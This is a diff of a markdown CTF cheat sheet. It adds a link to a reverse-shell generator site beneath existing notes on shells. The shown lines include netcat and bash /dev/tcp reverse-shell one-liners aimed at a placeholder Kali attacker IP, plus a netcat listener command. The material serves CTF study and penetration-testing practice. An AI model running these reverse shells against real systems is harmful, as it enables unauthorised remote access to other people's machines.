@@ -153,7 +153,10 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/bash`
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
   - `bash -c 'bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1'` this one is symbol safe it is useful when doing it in an url or something like this.
+
 > *Note: We have to set a listener prior to this with `rlwrap nc -lvp 4444`*
+
+- [Here is an amazing website to generate reverse shell](https://www.revshells.com/) there are plenty of options for bash and you can even encode it if you needé
 
 ## Permissions cheat sheet
 
